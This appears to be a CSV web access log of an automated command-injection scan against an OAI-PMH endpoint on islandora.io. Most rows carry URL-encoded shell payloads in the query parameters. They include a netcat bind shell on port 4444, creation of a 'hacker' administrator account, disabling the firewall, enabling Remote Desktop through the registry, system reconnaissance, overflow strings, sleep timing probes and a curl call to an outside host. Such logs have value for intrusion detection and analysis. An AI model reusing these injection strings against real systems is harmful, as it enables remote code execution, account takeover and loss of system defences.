uuid,timestamp,http_status_code,request_url,response_time,http_version
8164fa8b-c744-483a-b235-f99255fd1812,2025-01-01 15:42:21,200,http://islandora.io/oai/request?verb=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26,51.37 ms,HTTP/1.1
08a6549d-154b-4c94-9254-c4208bc759c2,2025-01-01 15:42:22,200,http://islandora.io/oai/request?verb=ListMetadataFormats,45.81 ms,HTTP/1.1
79dbb183-dda7-48e8-b9ba-588059388bbd,2025-01-01 15:42:22,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26,55.29 ms,HTTP/1.1
68d26915-5511-4528-930e-2140016b2bf5,2025-01-01 15:42:22,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26&set=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26,82.51 ms,HTTP/1.1
f0b463c4-58be-40f5-be0a-af6418c8ce4a,2025-01-01 15:42:23,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26&set=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26,80.81 ms,HTTP/1.1
5af20645-904d-4fb8-9d5c-8ddb66cccb70,2025-01-01 15:42:23,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+nc+-lvvp+4444+-e+%2Fbin%2Fsh+%26&metadataPrefix=oai_dc,56.78 ms,HTTP/1.1
876867c9-e4f0-4489-b822-d06445218add,2025-01-01 15:42:23,200,http://islandora.io/oai/request?verb=%26%26+net+localgroup+Administrators+hacker+%2FADD,58.33 ms,HTTP/1.1
f804727d-a128-4e26-9b88-2d9722f52d8d,2025-01-01 15:42:24,200,http://islandora.io/oai/request?verb=ListMetadataFormats,47.82 ms,HTTP/1.1
c561e307-798f-4a0e-b010-132a09e91dc7,2025-01-01 15:42:24,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+net+localgroup+Administrators+hacker+%2FADD,59.42 ms,HTTP/1.1
8574a8e5-38c3-4a8e-91d3-b776a5999015,2025-01-01 15:42:24,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%26%26+net+localgroup+Administrators+hacker+%2FADD&set=%26%26+net+localgroup+Administrators+hacker+%2FADD,83.23 ms,HTTP/1.1
09dd87f0-6625-4d01-bc34-e6e38787b1a2,2025-01-01 15:42:25,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+net+localgroup+Administrators+hacker+%2FADD&set=%26%26+net+localgroup+Administrators+hacker+%2FADD,56.18 ms,HTTP/1.1
10c86dd0-8a67-4609-a697-986e16c488d6,2025-01-01 15:42:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+net+localgroup+Administrators+hacker+%2FADD&metadataPrefix=marc,53.53 ms,HTTP/1.1
3c9f05d4-538f-41c0-8b24-736c679a17f1,2025-01-01 15:42:25,200,http://islandora.io/oai/request?verb=%26%26+net+user+hacker+Password1+%2FADD,55.94 ms,HTTP/1.1
eaefe66f-6a20-410c-9fed-440b63f7402f,2025-01-01 15:42:26,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+net+user+hacker+Password1+%2FADD,64.54 ms,HTTP/1.1
da2add52-3ea1-42c4-8109-d0ee4a0d777d,2025-01-01 15:42:26,200,http://islandora.io/oai/request?verb=ListSets,40.36 ms,HTTP/1.1
e4918a6c-6ffe-4e4a-aad7-8d514be7deb6,2025-01-01 15:42:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+net+user+hacker+Password1+%2FADD,47.36 ms,HTTP/1.1
739c1e32-5c9d-43f6-a374-8e5e6cf87441,2025-01-01 15:42:27,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26%26+net+user+hacker+Password1+%2FADD&set=%26%26+net+user+hacker+Password1+%2FADD,60.14 ms,HTTP/1.1
6864f38e-bdfc-4aba-8f78-8f6e273f6718,2025-01-01 15:42:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+net+user+hacker+Password1+%2FADD&metadataPrefix=marc,48.65 ms,HTTP/1.1
31e745db-24c8-46db-a8a8-6e6f40f49bba,2025-01-01 15:42:27,200,http://islandora.io/oai/request?verb=%26%26+net+view,66.50 ms,HTTP/1.1
31ae9d38-8ae9-40b9-a93f-e03d51054895,2025-01-01 15:42:28,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+net+view,81.22 ms,HTTP/1.1
9f16fa73-e486-4aae-af91-f75d82499616,2025-01-01 15:42:28,200,http://islandora.io/oai/request?verb=ListSets,58.05 ms,HTTP/1.1
f504e9c9-6243-44c7-a826-5ea76d3dfe72,2025-01-01 15:42:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%26%26+net+view,65.07 ms,HTTP/1.1
d2088266-7b19-439a-9788-36e1dee065ed,2025-01-01 15:42:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+net+view&until=%26%26+net+view,59.63 ms,HTTP/1.1
a1b10471-9e63-4578-9c19-755c1d5612a9,2025-01-01 15:42:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+net+view&metadataPrefix=marc,62.43 ms,HTTP/1.1
a1f1a0ae-3233-48ed-88b4-a32ee19b588a,2025-01-01 15:42:29,200,http://islandora.io/oai/request?verb=%26%26+netsh+firewall+set+opmode+disable,70.04 ms,HTTP/1.1
4c543fb8-4eec-47de-9681-6b3c54460067,2025-01-01 15:42:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.24 ms,HTTP/1.1
553c404e-da3c-4382-b55f-2d3e3cc781bf,2025-01-01 15:42:30,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+netsh+firewall+set+opmode+disable,60.21 ms,HTTP/1.1
b437fada-e49f-4227-b664-46bce14962e5,2025-01-01 15:42:30,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+netsh+firewall+set+opmode+disable&until=%26%26+netsh+firewall+set+opmode+disable&set=%26%26+netsh+firewall+set+opmode+disable,67.80 ms,HTTP/1.1
a4daa8ff-97a1-47fd-a3f9-6f2fee6bfe29,2025-01-01 15:42:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26%26+netsh+firewall+set+opmode+disable,87.97 ms,HTTP/1.1
6992ae5b-89df-4c07-adaf-b4425dc551fe,2025-01-01 15:42:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+netsh+firewall+set+opmode+disable&metadataPrefix=oai_dc,68.64 ms,HTTP/1.1
efe06920-5d08-4faf-9de1-f64f9c377c98,2025-01-01 15:42:32,200,http://islandora.io/oai/request?verb=%26%26+netstat+-an,58.11 ms,HTTP/1.1
8d0dda41-957b-42d9-b382-625d3ce2d64b,2025-01-01 15:42:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+netstat+-an,45.05 ms,HTTP/1.1
22098659-375f-4762-acaf-10fbab8fcc5c,2025-01-01 15:42:32,200,http://islandora.io/oai/request?verb=ListSets,54.99 ms,HTTP/1.1
2be183dd-f7e3-42ed-95b6-d7c7db1e456e,2025-01-01 15:42:33,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26%26+netstat+-an&set=%26%26+netstat+-an,56.53 ms,HTTP/1.1
1991fbd8-fcd2-4c70-84df-17e2078eb058,2025-01-01 15:42:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26%26+netstat+-an,48.88 ms,HTTP/1.1
ad9a346d-2c50-475d-b8dd-4b93af6797f4,2025-01-01 15:42:33,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+netstat+-an&metadataPrefix=marc,57.56 ms,HTTP/1.1
dd4ac307-2088-4076-88be-fb31e86cb9f8,2025-01-01 15:42:34,200,http://islandora.io/oai/request?verb=%26%26+perl+-e+%27print+%22X%22x16096%27,65.68 ms,HTTP/1.1
54d3f674-ca99-492f-99db-e1a0494a632f,2025-01-01 15:42:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+perl+-e+%27print+%22X%22x16096%27,52.33 ms,HTTP/1.1
f2861bd8-e465-4198-aa83-e006371317fb,2025-01-01 15:42:34,200,http://islandora.io/oai/request?verb=ListSets,59.47 ms,HTTP/1.1
3c135a0f-6744-4090-b510-490a08d1fbc6,2025-01-01 15:42:35,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26%26+perl+-e+%27print+%22X%22x16096%27&set=%26%26+perl+-e+%27print+%22X%22x16096%27,65.31 ms,HTTP/1.1
71e401b0-644f-411d-b09e-6f7a13910155,2025-01-01 15:42:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+perl+-e+%27print+%22X%22x16096%27&set=%26%26+perl+-e+%27print+%22X%22x16096%27,98.86 ms,HTTP/1.1
a7718f3a-3108-43ad-a2b7-6815302b184d,2025-01-01 15:42:35,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+perl+-e+%27print+%22X%22x16096%27&metadataPrefix=oai_dc,57.51 ms,HTTP/1.1
ec4b10c8-4449-4bea-a5a9-52fb1e24971b,2025-01-01 15:42:36,200,http://islandora.io/oai/request?verb=%26%26+perl+-e+%27print+%22X%22x2048%27,48.84 ms,HTTP/1.1
28ba0bdb-17d3-4e99-a7aa-715cdcf66136,2025-01-01 15:42:36,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.27 ms,HTTP/1.1
6e184587-418e-4b02-8295-dc1addbe226b,2025-01-01 15:42:36,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+perl+-e+%27print+%22X%22x2048%27,45.09 ms,HTTP/1.1
6387a872-bdc0-4e76-b69b-cd8fd0809909,2025-01-01 15:42:37,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+perl+-e+%27print+%22X%22x2048%27,61.45 ms,HTTP/1.1
7977e4fe-1149-49fb-bf23-aa56cb94f628,2025-01-01 15:42:37,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+perl+-e+%27print+%22X%22x2048%27&until=%26%26+perl+-e+%27print+%22X%22x2048%27&set=%26%26+perl+-e+%27print+%22X%22x2048%27,53.85 ms,HTTP/1.1
03178d36-5dbe-4777-894b-c0e2135c5958,2025-01-01 15:42:37,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+perl+-e+%27print+%22X%22x2048%27&metadataPrefix=marc,58.66 ms,HTTP/1.1
d74a5db7-5b3e-4b62-90eb-2bf69c56024c,2025-01-01 15:42:38,200,http://islandora.io/oai/request?verb=%26%26+perl+-e+%27print+%22X%22x4096%27,65.89 ms,HTTP/1.1
3bdd4d00-aea3-49b4-b267-bb67dce3bc75,2025-01-01 15:42:38,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.52 ms,HTTP/1.1
34216b2b-a7c7-442e-8053-765ce77a9fb8,2025-01-01 15:42:38,200,http://islandora.io/oai/request?verb=ListSets,60.09 ms,HTTP/1.1
6ce922b6-015d-4c12-bc85-daa05af8b1d4,2025-01-01 15:42:39,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+perl+-e+%27print+%22X%22x4096%27&set=%26%26+perl+-e+%27print+%22X%22x4096%27,62.96 ms,HTTP/1.1
a81b3f8c-3cf8-49ce-99a6-c583b9447865,2025-01-01 15:42:39,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26%26+perl+-e+%27print+%22X%22x4096%27&set=%26%26+perl+-e+%27print+%22X%22x4096%27,64.01 ms,HTTP/1.1
9c89cc7a-8cb0-4272-a50e-63ad387b15f8,2025-01-01 15:42:39,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+perl+-e+%27print+%22X%22x4096%27&metadataPrefix=marc,64.54 ms,HTTP/1.1
c3463eef-3cd0-444e-b68b-ba594420bc9e,2025-01-01 15:42:40,200,http://islandora.io/oai/request?verb=%26%26+perl+-e+%27print+%22X%22x8096%27,58.72 ms,HTTP/1.1
17c82012-f13b-4d2d-8d97-526c193e270a,2025-01-01 15:42:40,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+perl+-e+%27print+%22X%22x8096%27,71.79 ms,HTTP/1.1
98f90493-4e9a-42ee-a018-6c772187fa36,2025-01-01 15:42:40,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+perl+-e+%27print+%22X%22x8096%27,56.91 ms,HTTP/1.1
92809f85-57eb-49e5-b012-e841e0317ccd,2025-01-01 15:42:41,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+perl+-e+%27print+%22X%22x8096%27&until=%26%26+perl+-e+%27print+%22X%22x8096%27&set=%26%26+perl+-e+%27print+%22X%22x8096%27,85.26 ms,HTTP/1.1
0a03a794-d5f9-42f5-9f53-c4f1f421115b,2025-01-01 15:42:41,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,110.75 ms,HTTP/1.1
bdf6510d-b51b-45f2-8333-98a292dbcd9d,2025-01-01 15:42:41,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+perl+-e+%27print+%22X%22x8096%27&metadataPrefix=oai_dc,56.11 ms,HTTP/1.1
1258fa55-74db-431a-a753-8fb3b3e30891,2025-01-01 15:42:42,200,http://islandora.io/oai/request?verb=%26%26+phpinfo%28%29,60.37 ms,HTTP/1.1
41fefb72-30d6-4c9b-8c67-a06e62f2fbdd,2025-01-01 15:42:42,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.01 ms,HTTP/1.1
463436f2-474f-43fe-8796-49d42548b568,2025-01-01 15:42:42,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+phpinfo%28%29,49.76 ms,HTTP/1.1
0ac5a7eb-97ff-4b5b-b021-6bf6b9b1174b,2025-01-01 15:42:43,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,63.63 ms,HTTP/1.1
fe474957-674f-447f-a5fc-6357508fcd08,2025-01-01 15:42:43,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+phpinfo%28%29&until=%26%26+phpinfo%28%29&set=%26%26+phpinfo%28%29,53.52 ms,HTTP/1.1
959295cd-f23a-46ef-b6ae-bf9feaa28c48,2025-01-01 15:42:43,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+phpinfo%28%29&metadataPrefix=oai_dc,69.17 ms,HTTP/1.1
fcc5e384-f97f-4b6a-94ca-29089df2ebc3,2025-01-01 15:42:44,200,http://islandora.io/oai/request?verb=%26%26+pwd,57.66 ms,HTTP/1.1
049d5738-ed71-49b4-a2b9-99c9b333a813,2025-01-01 15:42:44,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.43 ms,HTTP/1.1
bc62aac1-f68b-4dc0-9cd5-f77c30ec389e,2025-01-01 15:42:45,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+pwd,65.28 ms,HTTP/1.1
dece2f0a-01d1-46cc-a7d1-aea36e538eb6,2025-01-01 15:42:45,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%26%26+pwd,65.78 ms,HTTP/1.1
84b93724-aab9-46eb-9ecb-431bc22eec2c,2025-01-01 15:42:45,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+pwd&until=%26%26+pwd,54.59 ms,HTTP/1.1
a2cc0379-bff4-4390-8d06-4a11c9f2fc92,2025-01-01 15:42:46,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+pwd&metadataPrefix=marc,54.71 ms,HTTP/1.1
e1266eb0-5617-4206-a75e-910f6081c813,2025-01-01 15:42:46,200,http://islandora.io/oai/request?verb=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff,67.27 ms,HTTP/1.1
8abc3847-1e6f-428a-94a0-23b656a5d6ce,2025-01-01 15:42:46,200,http://islandora.io/oai/request?verb=ListMetadataFormats,40.90 ms,HTTP/1.1
5df5e234-4474-462f-9416-614fb9f59bc9,2025-01-01 15:42:47,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff,53.64 ms,HTTP/1.1
4b210e61-da00-4f34-9839-5e8d046740b1,2025-01-01 15:42:47,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff&until=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff,66.66 ms,HTTP/1.1
35124ee1-973d-400e-aa3d-477030df8452,2025-01-01 15:42:47,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff&until=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff&set=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff,58.69 ms,HTTP/1.1
b199a12d-f8ce-45f7-a35c-addf10fe7f36,2025-01-01 15:42:48,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+reg+add+%22HKLM%5CSystem%5CCurrentControlSet%5CControl%5CTerminal+Server%22+%2Fv+fDenyTSConnections+%2Ft+REG_DWORD+%2Fd+0+%2Ff&metadataPrefix=marc,67.35 ms,HTTP/1.1
4f118c8c-6f43-41ed-9eb9-201f2fc1abd6,2025-01-01 15:42:48,200,http://islandora.io/oai/request?verb=%26%26+sleep+1,50.71 ms,HTTP/1.1
cd4f74c9-db6d-4ddd-bfc4-664a8eb0cb26,2025-01-01 15:42:48,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.93 ms,HTTP/1.1
64ac1d3f-13a3-436f-b7b8-c0bf9b310e43,2025-01-01 15:42:49,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+sleep+1,68.29 ms,HTTP/1.1
202e4eda-c76d-4416-a071-a15110fff99f,2025-01-01 15:42:49,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26%26+sleep+1,57.97 ms,HTTP/1.1
136a048d-f30c-424a-9609-335b5dcf7f5b,2025-01-01 15:42:49,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%26%26+sleep+1,55.74 ms,HTTP/1.1
c49e75ff-cdcf-4f33-8f33-21224569f52b,2025-01-01 15:42:50,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+sleep+1&metadataPrefix=oai_dc,63.14 ms,HTTP/1.1
0aa723dd-99e4-4e90-9fb9-12b3310023ca,2025-01-01 15:42:50,200,http://islandora.io/oai/request?verb=%26%26+sleep+10,58.84 ms,HTTP/1.1
786651c9-0808-4a19-a44a-e3f7f83e255e,2025-01-01 15:42:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+sleep+10,53.45 ms,HTTP/1.1
787307ba-ed6b-4045-a4a9-0fd8b2b9c9df,2025-01-01 15:42:51,200,http://islandora.io/oai/request?verb=ListSets,47.14 ms,HTTP/1.1
00565b87-8716-4e5b-976f-9fee6fd8b30d,2025-01-01 15:42:51,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+sleep+10&until=%26%26+sleep+10&set=%26%26+sleep+10,44.92 ms,HTTP/1.1
ad27e1b8-f3c1-4651-bab8-9729f66af957,2025-01-01 15:42:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26%26+sleep+10&set=%26%26+sleep+10,56.39 ms,HTTP/1.1
ac6b128e-8497-4f51-aa22-447c53974092,2025-01-01 15:42:52,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+sleep+10&metadataPrefix=marc,65.85 ms,HTTP/1.1
06ea9266-0b4d-452f-bb41-3e2a7a04988c,2025-01-01 15:42:52,200,http://islandora.io/oai/request?verb=%26%26+sleep+15,45.88 ms,HTTP/1.1
f00869c5-2e94-45b9-94e5-67438a4b957c,2025-01-01 15:42:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+sleep+15,81.84 ms,HTTP/1.1
0394d712-ff91-41f3-a546-1bc6f5f2fb5a,2025-01-01 15:42:53,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+sleep+15,72.89 ms,HTTP/1.1
6827dc7a-5c85-451c-b840-f1db8636ec77,2025-01-01 15:42:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+sleep+15&set=%26%26+sleep+15,58.53 ms,HTTP/1.1
438eb439-d3e4-42f1-a5b0-6e0f8b04cc21,2025-01-01 15:42:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%26%26+sleep+15,57.99 ms,HTTP/1.1
de8044a7-f990-45a4-9d29-7eaa4c921ed3,2025-01-01 15:42:54,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+sleep+15&metadataPrefix=marc,86.56 ms,HTTP/1.1
2cd923cb-8e56-498a-b9e9-1491da5d9eba,2025-01-01 15:42:54,200,http://islandora.io/oai/request?verb=%26%26+sleep+5,52.64 ms,HTTP/1.1
1b249acd-6e0d-439a-9c11-defae42fdee1,2025-01-01 15:42:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+sleep+5,54.00 ms,HTTP/1.1
8ec83e7a-da19-495d-a4f4-8a8641b4ad20,2025-01-01 15:42:55,200,http://islandora.io/oai/request?verb=ListSets,32.94 ms,HTTP/1.1
0ad77401-a856-4a8f-9a20-a1205655fb00,2025-01-01 15:42:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26%26+sleep+5&set=%26%26+sleep+5,74.83 ms,HTTP/1.1
98aae144-a26e-43b8-82f7-fd0d5c10b45a,2025-01-01 15:42:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26%26+sleep+5&set=%26%26+sleep+5,58.79 ms,HTTP/1.1
23a8e0f7-97b0-473e-8b82-63c4960dd39b,2025-01-01 15:42:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+sleep+5&metadataPrefix=marc,66.67 ms,HTTP/1.1
c948ffe1-9bd1-465e-aa17-37db4d425687,2025-01-01 15:42:56,200,http://islandora.io/oai/request?verb=%26%26+sysinfo,47.31 ms,HTTP/1.1
efb1a912-9346-4a4f-a2d2-ec2a8f0b1091,2025-01-01 15:42:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+sysinfo,44.81 ms,HTTP/1.1
6b2b9c5a-41b8-454c-90a8-8374317cd989,2025-01-01 15:42:57,200,http://islandora.io/oai/request?verb=ListSets,52.86 ms,HTTP/1.1
4d6b5c4b-0b68-4e2f-8287-44ab1d1c1e42,2025-01-01 15:42:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+sysinfo,41.69 ms,HTTP/1.1
0c8a89ce-c283-4e03-a3a7-eecced8e61db,2025-01-01 15:42:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+sysinfo&until=%26%26+sysinfo,49.17 ms,HTTP/1.1
8a5aff7e-c271-4412-a0c1-52e1ecfdc1de,2025-01-01 15:42:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+sysinfo&metadataPrefix=marc,56.84 ms,HTTP/1.1
b5fecf0c-ddea-4f53-af83-abb3acffb806,2025-01-01 15:42:58,200,http://islandora.io/oai/request?verb=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,61.18 ms,HTTP/1.1
b0016ced-061c-4bdd-bd4c-2cc00b4928a0,2025-01-01 15:42:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.87 ms,HTTP/1.1
f592bf7a-e1d9-4fee-b5f4-b0063aab3314,2025-01-01 15:42:59,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,49.05 ms,HTTP/1.1
80746705-e84d-4195-9a5a-ab37bac2b3d8,2025-01-01 15:42:59,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B&until=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B&set=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,92.01 ms,HTTP/1.1
ed284879-a8a2-475d-a324-8f39e94cb9b3,2025-01-01 15:43:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B&until=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B,69.42 ms,HTTP/1.1
3e776de0-a0b8-45ec-85c6-3c836a8c98a0,2025-01-01 15:43:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+system%28%27curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%27%29%3B&metadataPrefix=oai_dc,45.15 ms,HTTP/1.1
494197be-f14f-4acd-914a-e74be2578297,2025-01-01 15:43:00,200,http://islandora.io/oai/request?verb=%26%26+system%28%27sleep+5%27%29%3B,55.49 ms,HTTP/1.1
80dcd0e4-bb94-4baa-8791-d195bb814c03,2025-01-01 15:43:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+system%28%27sleep+5%27%29%3B,59.63 ms,HTTP/1.1
c1500829-7594-4d1f-a834-51dbd6aade3f,2025-01-01 15:43:01,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+system%28%27sleep+5%27%29%3B,49.31 ms,HTTP/1.1
7eba4fac-2c14-4567-80cc-d58c40976f5c,2025-01-01 15:43:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+system%28%27sleep+5%27%29%3B,69.49 ms,HTTP/1.1
